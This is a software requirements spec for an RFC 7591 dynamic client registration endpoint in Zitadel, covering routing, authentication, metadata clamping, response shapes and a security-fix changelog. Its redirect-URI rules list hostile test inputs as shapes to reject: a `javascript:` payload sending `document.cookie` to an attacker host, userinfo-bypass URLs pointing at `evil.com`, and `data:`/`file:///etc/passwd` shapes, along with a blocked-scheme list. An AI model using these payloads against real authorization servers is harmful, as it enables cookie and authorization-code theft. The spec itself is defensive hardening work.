---
created: "2026-04-24T00:00:00Z"
last_edited: "2026-04-27T00:00:00Z"
complexity: medium
---

# Cavekit: RFC 7591 Registration Handler (`POST /oidc/v1/register`)

## Scope
Defines the HTTP handler for `POST /oidc/v1/register`: request parsing, RFC 7591 §2 + OIDC Registration 1.0 §2 default application, authentication routing (anonymous vs IAT), metadata validation and clamping, `domain.OIDCApp` construction, the response shape (echo clamped values + `client_id`, optional `client_secret`, RAT, `registration_client_uri`, no-store cache headers), the full status-code matrix, `MaxRequestBodyBytes` enforcement, the Claude-Code-friendly default (`application_type=native` + `token_endpoint_auth_method=none` → public client), and supporting commands.

## Source
- Staged plan: `context/refs/dcr-plan.md`
- Authoritative sections: §1.1, §1.6, §2.3 (auth model), §2.6 (secret behavior), §2.7 (clamps), §3 (metadata mapping), §4.3 (handler flow), §15.4
- Spec references: RFC 7591 §2, §3.2.1, §3.2.2; OIDC Registration 1.0 §2; RFC 9700; RFC 8252 §7.3 (loopback)

## Requirements

### R1: Endpoint mounting and routing
**Description:** `POST /oidc/v1/register` must be mounted as part of the existing public OIDC prefix, multiplexed with the RFC 7592 management routes (cross-ref `cavekit-manage-handler.md`) by a gorilla `*mux.Router`.

**Acceptance Criteria:**
- [ ] `cmd/start/start.go` mounts the DCR handler such that `POST /oidc/v1/register` is reachable when the dual-gate from `cavekit-config.md` R3 is satisfied.
- [ ] The DCR handler is a gorilla `*mux.Router` multiplexing POST / GET / PUT / DELETE on `/oidc/v1/register{/*}`.
- [ ] Route registration order ensures the more-specific `/oidc/v1/register` prefix is registered BEFORE the broader `/oidc/v1` mount.
- [ ] When `OIDC.DCR.Enabled=false`, the path returns 404 (handler not mounted).
- [ ] When dual-gate startup is on but runtime feature is off, returns 403 with `{"error":"feature_disabled","error_description":"..."}` per `cavekit-config.md` R3.
- [ ] **Mount middleware stack (added 2026-04-27 / F-217).** The DCR handler (`/oidc/v1/register{/*}`) AND the RFC 8414 AS metadata handler (`/.well-known/oauth-authorization-server`) MUST be mounted via the SAME interceptor stack as the rest of the OIDC surface (as wrapped in `internal/api/oidc/op.go::NewServer`). At minimum the chain MUST include: `instanceInterceptor.Handler` (resolves the per-request instance from host — anonymous-mode tenancy depends on this), `accessInterceptor.Handle`, `limitingAccessInterceptor.Handle` (rate-limit on a write-amplifying unauthenticated endpoint is non-optional), and the access logger / activity handler. Mounting bare via `apis.RegisterHandlerOnPrefix(prefix, dcr.NewHandler(...))` is FORBIDDEN — without the instance interceptor, `authz.GetInstance(ctx)` returns the empty-instance sentinel and `featureGateMiddleware` reads its features as all-false, making the endpoint either unreachable in production OR (if any host-routing layer side-steps the gate) cross-tenant write with `instance_id=""`.
- [ ] **Mount-stack regression test.** A test or static check MUST assert that the start.go mount chain includes both `instanceInterceptor` and `limitingAccessInterceptor` for the DCR prefix. Source-string inspection of `cmd/start/start.go` is acceptable for this AC.

**Dependencies:** `cavekit-config.md` R1, R3.

### R2: Request decoding and defaults
**Description:** Requests are decoded as `application/json` with body size capped by `MaxRequestBodyBytes`. Omitted fields receive defaults from RFC 7591 §2 + OIDC Registration 1.0 §2 with explicit per-field attribution.

**Acceptance Criteria:**
- [ ] Request with `Content-Type` other than `application/json` returns HTTP 415 `unsupported_media_type` with the RFC 7591 error body shape.
- [ ] Request body exceeding `MaxRequestBodyBytes` returns HTTP 413 `payload_too_large`.
- [ ] Malformed JSON returns HTTP 400 with `error: invalid_client_metadata`.
- [ ] Missing `grant_types` defaults to `["authorization_code"]` (RFC 7591 §2).
- [ ] Missing `response_types` defaults to `["code"]` (RFC 7591 §2).
- [ ] Missing `token_endpoint_auth_method` defaults to `"client_secret_basic"` (RFC 7591 §2).
- [ ] Missing `application_type` defaults to `"web"` (OIDC Registration 1.0 §2 — NOT RFC 7591).
- [ ] Empty / missing `client_name` is replaced with the synthesized string `"Dynamically Registered Client <clientID[:8]>"`.
- [ ] Unknown JSON fields are silently dropped per RFC 7591 §2 (no error).

**Dependencies:** R1; `cavekit-config.md` R1 (`MaxRequestBodyBytes`).

### R3: Authentication routing (anonymous vs IAT)
**Description:** Two authentication modes coexist: anonymous (default) and IAT-required. Mode selection is per-instance via config; per-request behavior is determined by the presence of a Bearer header.

**Acceptance Criteria:**
- [ ] When `RequireInitialAccessToken=true` and no `Authorization` header is present → HTTP 401 `invalid_token` with `WWW-Authenticate: Bearer`.
- [ ] When an `Authorization: Bearer <token>` header is present, `authVerifyIAT` validates the token and consumes one use via `cavekit-iat.md` R2; on validation failure → HTTP 401 `invalid_token`.
- [ ] On successful IAT verification the handler resolves `{instance_id, org_id, project_id}` from the IAT claims; the IAT id is recorded for the audit event.
- [ ] In anonymous mode (no header, `RequireInitialAccessToken=false`), `instance_id` is derived from the request host and `{org_id, project_id}` from `OIDC.DCR.DefaultOrgID` / `DefaultProjectID`.
- [ ] In anonymous mode, the audit event records `iat_id=""` (sentinel for anonymous).
- [ ] Cross-instance / cross-org / cross-project IAT abuse (e.g. an IAT issued for project A used to register into project B) is rejected at handler level.
- [ ] **Auth-before-decode sequencing (added 2026-04-27 / F-219).** When `RequireInitialAccessToken=true` AND no `Authorization` header is present, the dispatcher MUST short-circuit with 401 `invalid_token` + `WWW-Authenticate: Bearer error="invalid_token"` BEFORE invoking the request decoder. The body cap, Content-Type check, and JSON parse MUST NOT execute on an unauthenticated probe — those error responses (413/415/400) leak server config (max body size, accepted content types, JSON-decoder behavior) to anonymous attackers fingerprinting the deployment. Anonymous mode (`RequireInitialAccessToken=false`) bypasses this check — the decoder runs unconditionally because anonymous registration is open by design.
- [ ] Pinned by a regression test that posts a 100 KiB body with `Content-Type: text/plain` and no Bearer header to an instance with `RequireInitialAccessToken=true`, and asserts: response is 401 + `WWW-Authenticate: Bearer error="invalid_token"`, NOT 413 (body cap) and NOT 415 (Content-Type). (added 2026-04-27 / F-219)
- [ ] **401 envelope phrasing (added 2026-04-27 / N-5).** All 401 responses (auth-first short-circuit, IAT verification failure, IAT consume failure, RAT verification failure) MUST use the `error_description` string `"missing or invalid access token"` (RFC 6750 §3 vocabulary). The fixed string keeps log-aggregator pattern matching stable and prevents drift across the four 401 paths.

**Dependencies:** `cavekit-config.md` R1; `cavekit-iat.md` R2, R4.

### R4: Metadata validation and clamping
**Description:** Server intersects requested metadata with allow-lists; when an intersection is empty for a required field, registration fails with `invalid_client_metadata` naming the field.

**Acceptance Criteria:**
- [ ] `grant_types` is intersected with `DCR.AllowedGrantTypes`; empty intersection on a required field → 400 `invalid_client_metadata` with the field name in `error_description`.
- [ ] `response_types` is intersected with `DCR.AllowedResponseTypes` after canonicalization (see next AC).
- [ ] **`response_type` value canonicalization (added 2026-04-27 / F-103).** `response_type` values are space-separated SETS of tokens per RFC 6749 §3.1.1; `"token id_token"` and `"id_token token"` denote the same response_type. The clamp MUST canonicalize each value via `canonicaliseResponseType(s)` — `strings.Fields(s)` + sort + join with single space — on BOTH the requested values AND the `DCR.AllowedResponseTypes` allow-list entries before `slices.Contains`-style equality / membership checks. The canonical form mirrors the spelling used by `github.com/zitadel/oidc/v3.ResponseTypeIDToken = "id_token token"` (alphabetical token order) so the rest of Zitadel's OIDC stack — which already depends on this canonical spelling at `internal/api/oidc/auth_request_converter.go::ResponseTypeToBusiness` — sees consistent values. Exact-string `slices.Contains` without canonicalization is FORBIDDEN.
- [ ] `token_endpoint_auth_method` is intersected with `DCR.AllowedAuthMethods`; `client_secret_jwt` is rejected with `invalid_client_metadata`.
- [ ] `application_type` is intersected with `DCR.AllowedApplicationTypes`.
- [ ] Each `redirect_uris` entry passes `domain.GetOIDCV1Compliance` AND the URL's `u.Hostname()` matches `DCR.AllowedRedirectURIHostPatterns` (when non-empty).
- [ ] **Host extraction algorithm (added 2026-04-27 / F-100).** Each `redirect_uris` entry MUST be parsed via `net/url.Parse`; the host check MUST use `u.Hostname()`. Hand-rolled split-on-`://`/`@`/`:` parsers are FORBIDDEN — they have repeatedly missed the RFC 3986 `userinfo` segment, allowing `https://app.example.com:8080@evil.com/cb` to satisfy a `*.example.com` host pattern while actually pointing at `evil.com` (authorization-code exfiltration vector).
- [ ] **Reject URLs carrying userinfo (added 2026-04-27 / F-100).** Any `redirect_uris` entry where `u.User != nil` (URL contains a `userinfo` segment before `@`) → 400 `invalid_redirect_uri`. RFC 7591 redirect URIs SHOULD NOT carry userinfo; OAuth 2.1 §4.1.2 redirect URIs MUST NOT include credentials. Defence-in-depth even when the parser is correct: a redirect URI carrying userinfo is structurally suspect.
- [ ] **Userinfo-bypass test coverage (added 2026-04-27 / F-100).** The clamp test suite MUST include at least 4 userinfo-bypass shapes — `https://victim.example.com@evil.com/cb`, `https://victim.example.com:443@evil.com/cb`, `https://user:pass@evil.com/cb`, and `https://[2001:db8::1]@evil.com/cb` (IPv6 with userinfo) — each MUST be rejected with `invalid_redirect_uri`.
- [ ] Loopback HTTP redirect URIs (`http://localhost:<port>/...`, `http://127.0.0.1:<port>/...`, `http://[::1]:<port>/...` with arbitrary ports) are accepted for `application_type=native`.
- [ ] **Redirect URI scheme allow-list (added 2026-04-27 / F-218).** Only the schemes `http`, `https`, and reverse-domain custom schemes (matching `^[a-z][a-z0-9+.-]*$` AND containing at least one `.`) are accepted. Custom schemes are accepted ONLY when `application_type=native` per RFC 8252 §7.1. Scheme matching is case-insensitive.
- [ ] **Hard-rejected schemes (added 2026-04-27 / F-218).** Any `redirect_uris` entry whose scheme (case-insensitively) is in `{javascript, data, vbscript, file, about, chrome, chrome-extension, ms-browser-extension}` → 400 `invalid_redirect_uri`. These schemes turn DCR into an XSS-distribution / file-disclosure vector. Native+`javascript:` is the headline shape — `redirect_uris=["javascript:fetch('https://attacker/?'+document.cookie)"]` MUST NOT be accepted even when `application_type=native`.
- [ ] **Scheme-bypass test coverage (added 2026-04-27 / F-218).** The clamp test suite MUST include at least 5 reject shapes — `javascript:alert(1)`, `data:text/html,<script>...</script>`, `vbscript:msgbox`, `file:///etc/passwd`, `JAVASCRIPT:alert(1)` (case-insensitivity) — each MUST be rejected with `invalid_redirect_uri` for both `application_type=native` AND `application_type=web`. The suite MUST also include 1 accept shape — `com.example.app:/callback` for `application_type=native` — and 1 reject shape — `com:/callback` (no dot) for `application_type=native`.
- [ ] `subject_type=pairwise` → 400 `invalid_client_metadata`; `public` accepted.
- [ ] `id_token_signed_response_alg` not in the server-advertised `id_token_signing_alg_values_supported` → 400 `invalid_client_metadata`.
- [ ] `request_object_signing_alg` and `*_encryption_alg` keys → 400 `invalid_client_metadata`.
- [ ] `software_statement` present while `SoftwareStatement.Enabled=false` → 400 `unapproved_software_statement` (NOT silently dropped); JTI extracted and recorded in audit before rejection.
- [ ] `redirect_uris` count exceeding `MaxRedirectURIs` → 400 `invalid_client_metadata`.
- [ ] `client_name#<lang>` localized variants are silently dropped.

**Dependencies:** `cavekit-config.md` R1.

### R5: Client secret behavior per auth method
**Description:** Secret issuance is determined by the clamped `token_endpoint_auth_method`.

**Acceptance Criteria:**
- [ ] `token_endpoint_auth_method=none` → no secret issued; response omits `client_secret`; PKCE S256 enforced; redirect URIs MUST be loopback or custom-scheme for `native`.
- [ ] `token_endpoint_auth_method=client_secret_basic` or `client_secret_post` → secret generated, hashed via the existing `newHashedSecretWithDefault` primitive, returned plaintext exactly once.
- [ ] `token_endpoint_auth_method=private_key_jwt` → `jwks_uri` REQUIRED in the request; no secret issued; SSRF guard from `cavekit-security-hardening.md` R2 applies to `jwks_uri` fetch.
- [ ] `token_endpoint_auth_method=client_secret_jwt` → 400 `invalid_client_metadata` (excluded from default `AllowedAuthMethods`).

**Dependencies:** R4; `cavekit-security-hardening.md` R2.

### R6: `domain.OIDCApp` construction and command emission
**Description:** Validated metadata is mapped to `domain.OIDCApp` via a new helper, then a command emits the application-creation events plus DCR-specific audit events. The command reuses the existing `OIDCApplicationWriteModel` rather than introducing a new write model.

**Acceptance Criteria:**
- [ ] `internal/domain/application_oidc.go` exposes `OIDCAppFromRFC7591Metadata` mapping clamped metadata onto `OIDCApp`.
- [ ] The metadata-table mapping in §3 of the plan is implemented exactly: `client_name → AppName`, `redirect_uris → RedirectUris`, `grant_types → GrantTypes`, `response_types → ResponseTypes`, `token_endpoint_auth_method → AuthMethodType`, `application_type → ApplicationType` (`web→Web`, `native→Native`, `browser`/`user_agent→UserAgent`), `post_logout_redirect_uris → PostLogoutRedirectUris`, `backchannel_logout_uri → BackChannelLogoutURI`.
- [ ] Other RFC 7591 fields (`contacts`, `logo_uri`, `client_uri`, `policy_uri`, `tos_uri`, `software_id`, `software_version`, `default_max_age`, `require_auth_time`, `default_acr_values`, `initiate_login_uri`) are stored in the `dcr_meta` JSONB column without acting on them.
- [ ] `internal/command/dynamic_client_registration.go` exposes `RegisterClient(ctx, app, orgID, projectID, iatID, dcrMeta)` returning `(clientID, clientSecret?, rat, ratExpiresAt)`.
- [ ] On success the command emits, in order: `ApplicationAddedEvent` (existing), `OIDCConfigAddedEvent` (existing), `ApplicationDynamicallyRegisteredEvent` (new), `ApplicationRegistrationAccessTokenSetEvent` (new).
- [ ] `ApplicationDynamicallyRegisteredEvent` payload contains `{initial_access_token_id, software_statement_jti, registration_method, client_name_unclamped, remote_addr_sha256, user_agent}`.
- [ ] `remote_addr_sha256` is computed from `internal/api/http/header.go:107` `RemoteIPStringFromRequest` (XFF first hop, fallback to `r.RemoteAddr`); the SHA-256 of that IP string is what the event stores (never plaintext IP).
- [ ] `ApplicationRegistrationAccessTokenSetEvent` carries the Passwap-encoded RAT hash (never plaintext).
- [ ] No new write model is introduced; the existing `OIDCApplicationWriteModel` is reused.
- [ ] **IAT slot consume in dispatcher (added 2026-04-27 / F-200).** When the registration is IAT-mode (RegistrationContext.IATID != ""), the dispatcher MUST invoke `Commands.ConsumeInitialAccessToken` BEFORE `RegisterClient` returns. Consume failure (Errors.DCR.IAT.Exhausted / Revoked / Expired) → HTTP 401 `invalid_token` with `WWW-Authenticate: Bearer error="invalid_token"`, NOT 400 invalid_client_metadata. Pinned by an integration test that registers twice with the same IAT(MaxUses=1) and asserts the second attempt receives 401.
- [ ] **Consume order vs clamp (added 2026-04-27 / N-6).** The dispatcher MUST consume the IAT slot AFTER `ValidateAndClampMetadata` succeeds, NOT before. Burning IAT slots on bad-metadata requests turns one valid IAT into N-many DoS amplification (an attacker who steals one valid IAT can burn N slots by sending N malformed bodies). Clamp errors are not metadata-fault attribution — they MUST NOT cost the operator an IAT slot. Pinned by a regression test that posts an IAT-authenticated request with deliberately-bad clamp input (e.g. `redirect_uris=["javascript:alert(1)"]`); asserts ConsumeIAT is NOT invoked AND the 400 invalid_redirect_uri envelope fires.

**Dependencies:** R4; `cavekit-iat.md` R2 (IAT consumption); `cavekit-security-hardening.md` R3 (audit-event field redaction).

### R7: 201 response shape
**Description:** A successful registration returns HTTP 201 with the RFC 7591 §3.2.1 response body and mandated cache headers.

**Acceptance Criteria:**
- [ ] Response status is 201.
- [ ] `Content-Type` header is `application/json;charset=UTF-8`.
- [ ] `Cache-Control: no-store` and `Pragma: no-cache` headers are present.
- [ ] Response body echoes every clamped metadata value back to the client.
- [ ] Body includes `client_id` (server-generated).
- [ ] Body includes `client_secret` when (and only when) `token_endpoint_auth_method` ∈ `{client_secret_basic, client_secret_post}`.
- [ ] Body includes `client_id_issued_at` (unix seconds).
- [ ] Body includes `client_secret_expires_at`: when `OIDC.DCR.ClientSecretExpiresIn=0` → MUST emit `0` (RFC 7591 §3.2.1 sentinel for "no expiry"). When non-zero → MUST emit `ClientIDIssuedAt.Add(ClientSecretExpiresIn).Unix()`. The dispatcher MUST plumb `config.OIDC.DCR.ClientSecretExpiresIn` from the command result through `RegistrationOutput.ClientSecretExpiresIn` into the response writer; `clientSecretExpiresAtFor` is the single source of truth. Pinned by a unit test that sets `ClientSecretExpiresIn=24h` and asserts the response `client_secret_expires_at` ≈ now + 24h ± 5s.
- [ ] Body includes `registration_access_token` (plaintext, one-time).
- [ ] Body includes `registration_client_uri` constructed as `fmt.Sprintf("%s/oidc/v1/register/%s", op.IssuerFromContext(ctx), clientID)` (matches `internal/api/oidc/server.go:176`).
- [ ] All 4xx error bodies use `Content-Type: application/json;charset=UTF-8` with shape `{"error":"<code>","error_description":"<text>"}` per RFC 7591 §3.2.2.

**Dependencies:** R6.

### R8: Status-code matrix
**Description:** The handler returns an exact mapping of HTTP status codes to error conditions. RFC 7591 §3.2.2 only defines 400 + four code strings; 401/413/415/429 are documented HTTP extensions permitted by the RFC.

**Acceptance Criteria:**
- [ ] 201 — successful registration.
- [ ] 400 with code `invalid_client_metadata` — clamp failure, schema validation failure, malformed JSON.
- [ ] 400 with code `invalid_redirect_uri` — at least one redirect URI fails compliance or host-pattern check.
- [ ] 400 with code `invalid_software_statement` — present, parsed, but content-invalid (when feature enabled).
- [ ] 400 with code `unapproved_software_statement` — present while `SoftwareStatement.Enabled=false`.
- [ ] 401 with code `invalid_token` and header `WWW-Authenticate: Bearer` — IAT mode without header, bad IAT, exhausted IAT.
- [ ] 413 — body exceeds `MaxRequestBodyBytes`.
- [ ] 415 — `Content-Type` not `application/json`.
- [ ] 429 — instance access quota exceeded (inherited from `limitingAccessInterceptor`).
- [ ] 404 — DCR disabled at config (handler unmounted).
- [ ] 403 with code `feature_disabled` — startup gate on but runtime feature flag off (`cavekit-config.md` R3).
- [ ] **500 — internal error envelope (added 2026-04-27 / F-202).** Internal errors (DB push failure, eventstore unavailable, panic-recovery) MUST NOT echo `err.Error()` to the response body. The envelope MUST carry a fixed `error_description` (`"internal server error"`) and the `error` code MUST be `server_error` (mirrors RFC 6749 §5.2 — NOT one of the RFC 7591 §3.2.2 metadata-codes since this is not a metadata fault). The full error chain MUST be logged server-side at WARN+ severity for operator recovery; the response body is never the diagnostic surface.
- [ ] **`error_description` input redaction (added 2026-04-27 / F-202).** Any `error_description` value derived from user input (malformed Content-Type, malformed redirect URI, JSON parse error message) MUST be capped at 256 bytes after stripping ASCII control characters (< 0x20 except `\t`). Prevents log-injection and oversized reflected-input flow into log aggregators.

**Dependencies:** R1, R2, R3, R4.

### R9: Claude Code compatibility
**Description:** The exact request shape Claude Code sends today must produce a 201 with no `client_secret` and a usable `registration_client_uri`.

**Acceptance Criteria:**
- [ ] An integration test posts the literal Claude Code body `{client_name, redirect_uris:["http://localhost:54212/callback"], grant_types:["authorization_code","refresh_token"], response_types:["code"], token_endpoint_auth_method:"none", application_type:"native", scope:"openid profile email offline_access"}` and asserts: 201, no `client_secret` in body, `registration_access_token` present, `registration_client_uri` absolute and matches the issuer.
- [ ] The same test follows up with an `authorization_code` flow using PKCE S256 against the registered client and asserts a successful token issuance.
- [ ] The integration test file is `internal/api/oidc/integration_test/dcr_claude_code_compat_test.go` with `//go:build integration`.

**Dependencies:** R5, R7.

### R10: TLS posture
**Description:** The handler inherits Zitadel's overall TLS posture; production deployments MUST terminate TLS in front of Zitadel (or use Zitadel's built-in TLS) per RFC 7591 §5.

**Acceptance Criteria:**
- [ ] `/oidc/v1/register` is reachable over the same hostname/port/TLS configuration as `/oidc/v1/userinfo`.
- [ ] No DCR-specific TLS configuration knobs exist.
- [ ] The deployment guide documents the production TLS-termination requirement (cross-ref `cavekit-console-ui-docs-and-observability.md` R3).

**Dependencies:** R1.

## Out of Scope
- RFC 7592 management operations (handled in `cavekit-manage-handler.md`).
- Inline `jwks` (Phase 2) — see `cavekit-inline-jwks.md`.
- `software_statement` trusted-issuer verification (Phase 2 — Phase 1 only rejects with `unapproved_software_statement`) — see `cavekit-software-statement.md`.
- `client_credentials` in default `AllowedGrantTypes` (admin opt-in).
- Per-org DCR overrides (Phase 2) — see `cavekit-org-dcr-policy.md`.
- `client_name#<lang>` localized names.

## Cross-References
- See `cavekit-config.md` R1, R3, R4, R5: config knobs and dual-gate.
- See `cavekit-iat.md` R2, R4: IAT verification + consume.
- See `cavekit-manage-handler.md` R1: shared mux router and shared validate/clamp/error helpers.
- See `cavekit-discovery-and-as-metadata.md` R1: `registration_endpoint` advertisement points at this handler.
- See `cavekit-security-hardening.md` R1, R2, R3: SSRF guard for `jwks_uri`, log redaction, timing-side-channel.
- See `cavekit-console-ui-docs-and-observability.md` R3, R4, R5: docs + audit events + OTel spans `oidc.dcr.register`.

## Source Traceability (brownfield)
- `internal/api/oidc/sign/` — precedent for an `internal/api/oidc/<sub>/` package layout. [VERIFIED] subpackage convention.
- `internal/domain/application_oidc.go:221` — `GetOIDCV1Compliance`. [VERIFIED] line corrected per audit pass 5.
- `internal/domain/application_oidc.go:382-419` — `onlyLocalhostIsHttp` uses `netip.IsLoopback()`. [VERIFIED] passes loopback at registration.
- `internal/api/http/header.go:107` — `RemoteIPStringFromRequest`. [VERIFIED] XFF-first-hop, fallback `r.RemoteAddr`; does NOT parse `CF-Connecting-IP`, `X-Real-IP`, RFC 7239 `Forwarded`.
- `internal/api/oidc/server.go:176` — `op.IssuerFromContext` use site for issuer construction. [VERIFIED] reused for `registration_client_uri`.
- `internal/command/crypto.go` `newHashedSecretWithDefault` — secret hashing primitive. [VERIFIED] reused.
- `internal/api/oidc/op.go` — `Config.DCR` threading point. [GAP] not yet wired.
- `cmd/start/start.go:446` — `oidcPrefixes` slice / general `/oidc/v1` mount. [GAP] DCR handler not mounted.
- `internal/query/projection/app.go:159-228` — `appProjection.Reducers()` slice that must be extended for the three new application events. [GAP] reducers not present.

## Changelog
- 2026-04-24: Initial draft from `dcr-plan.md`.

### 2026-04-27 — Revision (F-103 / `--trace`)
- **Affected:** R4
- **Summary:** R4's `response_types` intersection AC didn't pin equality semantics. T-034 implementer used exact-string `slices.Contains`, but RFC 6749 §3.1.1 defines `response_type` values as space-separated SETS — `"token id_token"` ≡ `"id_token token"`. Spec-compliant clients sending `"token id_token"` got 400. Amendment adds a canonicalization AC: both requested values and allow-list MUST run through `canonicaliseResponseType` (Fields + sort + join) before comparison. Mirrors `zitadel/oidc/v3.ResponseTypeIDToken = "id_token token"` upstream canonical spelling so the rest of Zitadel's OIDC stack sees consistent strings.
- **Commits:** 66f16cf99 (T-034 originally) — fix commits to follow.
- **Pattern category:** unspecified-parser-contract (THIRD entry — F-100 host parser, F-101 dummy hash, F-103 set-equality semantics — triggers cross-kit amendment recommendation at cavekit-writing skill level).

### 2026-04-27 — Revision (F-100 / `--trace`)
- **Affected:** R4
- **Summary:** Original R4 host-pattern AC said "matches DCR.AllowedRedirectURIHostPatterns" but did not pin the host-extraction algorithm. T-034 implementation rolled a hand-cut parser that missed the RFC 3986 `userinfo` segment, allowing `https://app.example.com:8080@evil.com/cb` to satisfy `*.example.com` while pointing at `evil.com` — authorization-code exfiltration. Amendment adds three ACs: (1) host extraction MUST use `net/url.Parse` + `u.Hostname()` (no hand-rolled parsers); (2) URLs with `u.User != nil` MUST be rejected with `invalid_redirect_uri` per OAuth 2.1 §4.1.2; (3) clamp test suite MUST cover 4 named userinfo-bypass shapes including IPv6+userinfo.
- **Commits:** 66f16cf99 (T-034 originally landed the unsafe hand-rolled parser). Regression test + fix commits to follow.
- **Pattern category:** unspecified-parser-contract.
